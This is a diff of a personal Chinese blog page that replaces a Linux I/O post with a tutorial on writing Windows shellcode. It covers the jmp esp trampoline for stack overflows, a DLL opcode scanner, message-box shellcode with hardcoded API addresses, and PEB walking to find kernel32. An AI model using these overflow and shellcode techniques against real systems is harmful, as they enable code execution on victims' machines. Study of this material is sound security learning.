@@ -71,7 +71,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="linux," />
+  <meta name="keywords" content="pwn," />
 
 
 
@@ -87,17 +87,17 @@
 
 
 
-<meta name="description" content="前言&amp;emsp;&amp;emsp;以防把学过的函数忘了，或者遇到新的函数而过两天又忘了，在这里备忘以及统计新学的函数。主要针对apue和unix环境下的编程。 不带缓存的文件I/O类&amp;emsp;&amp;emsp;为什么是不带缓存呢？因为C语言下从FILE结构体定义的文件流和相关函数fread、fwrite等，到实际调用ReadFile等API，需要经过增加缓冲区保护、缓冲、换行符的转换等复杂的过程。所以在这里">
-<meta name="keywords" content="linux">
+<meta name="description" content="关于Shellcode的知识和实践&amp;emsp;&amp;emsp;平常都是使用网上的shellcode，现在学一学怎么写shellcode和shellcode的艺术。 jmp esp&amp;emsp;&amp;emsp;缓冲区大小不足以塞下shellcode或无法精确定位到shellcode时，可以利用esp来作为一个跳板。esp中地址不会被破坏而且在函数返回时，esp指向返回地址的下一个位置。所以把shellcode">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="linux 函数记录">
-<meta property="og:url" content="http://www.wuweinan.top/2017/04/18/linux-C函数记录/index.html">
+<meta property="og:title" content="shellcode学习">
+<meta property="og:url" content="http://www.wuweinan.top/2017/04/27/shellcode学习/index.html">
 <meta property="og:site_name" content="wwNan's blog">
-<meta property="og:description" content="前言&amp;emsp;&amp;emsp;以防把学过的函数忘了，或者遇到新的函数而过两天又忘了，在这里备忘以及统计新学的函数。主要针对apue和unix环境下的编程。 不带缓存的文件I/O类&amp;emsp;&amp;emsp;为什么是不带缓存呢？因为C语言下从FILE结构体定义的文件流和相关函数fread、fwrite等，到实际调用ReadFile等API，需要经过增加缓冲区保护、缓冲、换行符的转换等复杂的过程。所以在这里">
-<meta property="og:updated_time" content="2017-04-24T07:25:31.887Z">
+<meta property="og:description" content="关于Shellcode的知识和实践&amp;emsp;&amp;emsp;平常都是使用网上的shellcode，现在学一学怎么写shellcode和shellcode的艺术。 jmp esp&amp;emsp;&amp;emsp;缓冲区大小不足以塞下shellcode或无法精确定位到shellcode时，可以利用esp来作为一个跳板。esp中地址不会被破坏而且在函数返回时，esp指向返回地址的下一个位置。所以把shellcode">
+<meta property="og:updated_time" content="2017-04-27T07:23:12.456Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="linux 函数记录">
-<meta name="twitter:description" content="前言&amp;emsp;&amp;emsp;以防把学过的函数忘了，或者遇到新的函数而过两天又忘了，在这里备忘以及统计新学的函数。主要针对apue和unix环境下的编程。 不带缓存的文件I/O类&amp;emsp;&amp;emsp;为什么是不带缓存呢？因为C语言下从FILE结构体定义的文件流和相关函数fread、fwrite等，到实际调用ReadFile等API，需要经过增加缓冲区保护、缓冲、换行符的转换等复杂的过程。所以在这里">
+<meta name="twitter:title" content="shellcode学习">
+<meta name="twitter:description" content="关于Shellcode的知识和实践&amp;emsp;&amp;emsp;平常都是使用网上的shellcode，现在学一学怎么写shellcode和shellcode的艺术。 jmp esp&amp;emsp;&amp;emsp;缓冲区大小不足以塞下shellcode或无法精确定位到shellcode时，可以利用esp来作为一个跳板。esp中地址不会被破坏而且在函数返回时，esp指向返回地址的下一个位置。所以把shellcode">
 
 
 
@@ -125,13 +125,13 @@
 
 
 
-  <link rel="canonical" href="http://www.wuweinan.top/2017/04/18/linux-C函数记录/"/>
+  <link rel="canonical" href="http://www.wuweinan.top/2017/04/27/shellcode学习/"/>
 
 
 
 
 
-  <title> linux 函数记录 | wwNan's blog </title>
+  <title> shellcode学习 | wwNan's blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -270,7 +270,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://www.wuweinan.top/2017/04/18/linux-C函数记录/">
+    <link itemprop="mainEntityOfPage" href="http://www.wuweinan.top/2017/04/27/shellcode学习/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Weinan Wu">
@@ -291,7 +291,7 @@
             
             
               
-                linux 函数记录
+                shellcode学习
               
             
           </h1>
@@ -306,8 +306,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-18T12:43:35+08:00">
-                2017-04-18
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-27T13:51:57+08:00">
+                2017-04-27
               </time>
             
 
@@ -342,32 +342,15 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;以防把学过的函数忘了，或者遇到新的函数而过两天又忘了，在这里备忘以及统计新学的函数。主要针对apue和unix环境下的编程。</p>
-<h3 id="不带缓存的文件I-O类"><a href="#不带缓存的文件I-O类" class="headerlink" title="不带缓存的文件I/O类"></a>不带缓存的文件I/O类</h3><p>&emsp;&emsp;为什么是不带缓存呢？因为C语言下从FILE结构体定义的文件流和相关函数fread、fwrite等，到实际调用ReadFile等API，需要经过增加缓冲区保护、缓冲、换行符的转换等复杂的过程。所以在这里记录的主要是不带缓存的open、read等I/O函数,每一个都调用一个系统调用。linux以”int 80”进入系统调用，根据eax的值，即调用号在一个单位偏移量为4字节的系统调用表中寻找是哪个系统调用，如eax=0时是sys_exit。ebx,ecx,edx,esi,edi,ebp六个寄存器用来传递参数，在进入内核态时，会把六个寄存器的值依次入栈，一方面把寄存器空出来，另一方面系统调用函数可以直接在栈上取参数。</p>
-<ol>
-<li><p>#include “sys/types.h” “sys/stat.h” “fcntl.h”<br><strong>int open(const char* pathname, in oflag, //mode_t mode);</strong><br>//文件名，O_RDONLY | O_WRONLY | O_RDWR | O_CREAT | O_APPEND，创建文件时使用第三参数<br>//打开、创建文件，返回文件描述符</p>
-</li>
-<li><p>#include “unistd.h”<br><strong>int close(int fd);</strong><br>//关闭文件</p>
-</li>
-<li><p>#include “sys/types.h” “unistd.h”<br><strong>off_t lseek(int fd, off_t offset, int whence);</strong><br>//fd, 偏移, SEEK_SET(文件头) | SEEK_CUR(当前) | SEEK_END(末尾)<br>//设置文件位移量，偏移量大于文件长度时，下一次写会延长该文件</p>
-</li>
-<li><p>#include “unistd.h”<br><strong>ssize_t read(int fd, void *buff, size_t nbytes);</strong><br>//返回读到的字节数，文件末尾为0，出错-1</p>
-</li>
-<li><p>#include “unistd.h”<br><strong>ssize_t write(int fd, const void *buff, size_t nbytes);</strong><br>//正常返回写入字节数，出错-1</p>
-</li>
-<li><p>#include “unistd.h”<br>//复制文件描述符<br><strong>int dup(int fd);</strong><br>//返回当前可用文件描述符的最小值<br>int dup2(int fd, int fd2)<br>//用fd2指定新的描述符数值</p>
-</li>
-<li><p>#include “sys/types.h” “unistd.h” “fcntl.h”<br><strong>int fcntl(int fd, int cmd, //int arg);</strong><br>返回值需要和O_ACCMODE等进行 &amp; 操作 获得结果</p>
+        <h1 id="关于Shellcode的知识和实践"><a href="#关于Shellcode的知识和实践" class="headerlink" title="关于Shellcode的知识和实践"></a>关于Shellcode的知识和实践</h1><p>&emsp;&emsp;平常都是使用网上的shellcode，现在学一学怎么写shellcode和shellcode的艺术。</p>
+<h2 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h2><p>&emsp;&emsp;缓冲区大小不足以塞下shellcode或无法精确定位到shellcode时，可以利用esp来作为一个跳板。esp中地址不会被破坏而且在函数返回时，esp指向返回地址的下一个位置。所以把shellcode放在返回地址之后，函数返回时先去执行jmp esp或call esp等指令，之后正好跳进shellcode。可以从和程序一起被加载进内存的动态链接库中获取jmp esp的地址，kernel32.dll,user32.dll等。以下代码可以获取地址。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">#include&lt;Windows.h&gt;</div><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#define DLL_NAME &quot;user32.dll&quot;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	BYTE* ptr;</div><div class="line">	int position, address;</div><div class="line">	HINSTANCE handle;</div><div class="line">	BOOL done_flag = FALSE;</div><div class="line">	handle = LoadLibrary(DLL_NAME);</div><div class="line">	if (!handle)</div><div class="line">	&#123;</div><div class="line">		printf(&quot;load error !\n&quot;);</div><div class="line">		exit(0);</div><div class="line">	&#125;</div><div class="line">	ptr = (BYTE*)handle;</div><div class="line"></div><div class="line">	for (position = 0; !done_flag; position++)</div><div class="line">	&#123;</div><div class="line"></div><div class="line">			if (ptr[position] == 0xFF &amp;&amp; ptr[position + 1] == 0xE4)</div><div class="line">			&#123;</div><div class="line">				//0xFFE4 jmp esp</div><div class="line">				address = (int)ptr + position;</div><div class="line">				printf(&quot;OPCODE found at 0x%x\n&quot;, address);</div><div class="line">			&#125;</div><div class="line">	&#125;</div><div class="line">	return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;这里选择0x7e493400处的jmp esp作为跳板，shellcode中调用的MessageboxA地址是0x7e4507ea，ExitProcess地址是0x7c81cafa。shellcode如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">#include&lt;Windows.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">	HINSTANCE libHandle;</div><div class="line">	char dll[11] = &quot;user32.dll&quot;;</div><div class="line">	libHandle = LoadLibrary(dll);</div><div class="line">	_asm &#123;</div><div class="line">		sub sp, 0x440</div><div class="line">		xor ebx,ebx</div><div class="line">		push ebx	//cut string</div><div class="line">		push 0x74736577	//fialwest</div><div class="line">		push 0x6c696166</div><div class="line"></div><div class="line">		mov eax,esp</div><div class="line">		push ebx</div><div class="line">		push eax</div><div class="line">		push eax</div><div class="line">		push ebx</div><div class="line"></div><div class="line">		mov eax,0x7e4507ea</div><div class="line">		call eax	//call MessageboxA</div><div class="line"></div><div class="line">		push ebx</div><div class="line">		mov eax, 0x7c81cafa</div><div class="line">		call eax	//call exit(0)</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;把shellcode转化为机器码，再根据缓冲区的情况，假设缓冲区大小为20字节。可以先填入24任意字节，再填入jmp esp地址0x7e493400，后面跟shellcode机器码。这样就不用去找buf的起始地址了。<br>00401067  |.  33DB          xor     ebx, ebx<br>00401069  |.  53            push    ebx<br>0040106A  |.  68 77657374   push    74736577<br>0040106F  |.  68 6661696C   push    6C696166<br>00401074  |.  8BC4          mov     eax, esp<br>00401076  |.  53            push    ebx<br>00401077  |.  50            push    eax<br>00401078  |.  50            push    eax<br>00401079  |.  53            push    ebx<br>0040107A  |.  B8 EA07457E   mov     eax, 7E4507EA<br>0040107F  |.  FFD0          call    eax</p>
+<h2 id="动态定位API"><a href="#动态定位API" class="headerlink" title="动态定位API"></a>动态定位API</h2><p>&emsp;&emsp;动态链接库在不同的操作系统下，加载基址不同。所以要根据不同的系统动态定位API地址，提高shellcode兼容性。方法如下:</p>
 <blockquote>
-<p>cmd=F_DUPFD 复制显存的描述符<br>cmd=F_GETFD|F_SETFD 获得/设置文件描述符标记<br>cmd=F_GETFL|F_SETFL 获得/设置文件状态标志<br>cmd=F_GETOWN|F_SETOWN 获得/设置异步I/O权<br>cmd=F_GETLK|F_SETLK/F_SETKW 获得/设置记录锁</p>
+<p>FS为TEB的基址，基址+0x30放着PEB指针<br>PEB中偏移0X0C放着PEB_LDR_DATA结构体的指针<br>PEB_LDR_DATA偏移0X1C是指向模块初始化链表的指针<br>模块初始化链表第一个结点是ntdll.dll,第二个是kernell.dll，以此类推<br>找到kernel.dll后，基址加0x08是在加载基地址(1)，从加载基址偏移0X3C是PE头<br>PE头偏移0x78是函数导出表的指针，根据导出函数序号可以找到相应的函数偏移(2)<br>API的地址为(1)+(2)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">mov ebx,fs:[edx+0x30]	//PEB</div><div class="line">mov ecx,[ebx+0x0C]	//PLD</div><div class="line">mov ecx,[ecx+0x1C]	//list</div><div class="line">mov ecx,[ecx]		//kernel.dll entry</div><div class="line">mov ebp,[ecx+0x08]	//base address</div></pre></td></tr></table></figure></p>
 </blockquote>
-</li>
-<li><p>#include “unistd.h” “sys/ioctl.h”<br><strong>int ioctl(int fd, int request,…);</strong><br>//可用于文件I/O，磁带I/O，套接口I/O，终端I/O。对设备进行操作最容易的方法。</p>
-</li>
-</ol>
-<p>读/写磁盘文件时，以上函数都带有缓存机制。</p>
-<p>### </p>
-
+<h2 id="根据书，实现允许外部网络连接的shell的shellcode"><a href="#根据书，实现允许外部网络连接的shell的shellcode" class="headerlink" title="根据书，实现允许外部网络连接的shell的shellcode"></a>根据书，实现允许外部网络连接的shell的shellcode</h2>
       
     </div>
 
@@ -396,7 +379,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/linux/" rel="tag"># linux</a>
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
           
         </div>
       
@@ -409,18 +392,14 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/04/18/SQL-lab-writeup-POST篇/" rel="next" title="SQL-lab writeup POST篇">
-                <i class="fa fa-chevron-left"></i> SQL-lab writeup POST篇
-              </a>
-            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/04/11/pwnable-kr学习pwn-虽然是从零开始/" rel="prev" title="pwnable.kr学习pwn--虽然是从零开始">
-                pwnable.kr学习pwn--虽然是从零开始 <i class="fa fa-chevron-right"></i>
+              <a href="/2017/04/20/Mini-CRT/" rel="prev" title="Mini CRT的实现">
+                Mini CRT的实现 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -566,7 +545,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#不带缓存的文件I-O类"><span class="nav-number">1.1.</span> <span class="nav-text">不带缓存的文件I/O类</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#关于Shellcode的知识和实践"><span class="nav-number">1.</span> <span class="nav-text">关于Shellcode的知识和实践</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#jmp-esp"><span class="nav-number">1.1.</span> <span class="nav-text">jmp esp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#动态定位API"><span class="nav-number">1.2.</span> <span class="nav-text">动态定位API</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#根据书，实现允许外部网络连接的shell的shellcode"><span class="nav-number">1.3.</span> <span class="nav-text">根据书，实现允许外部网络连接的shell的shellcode</span></a></li></ol></li></ol></div>
             
 
           </div>
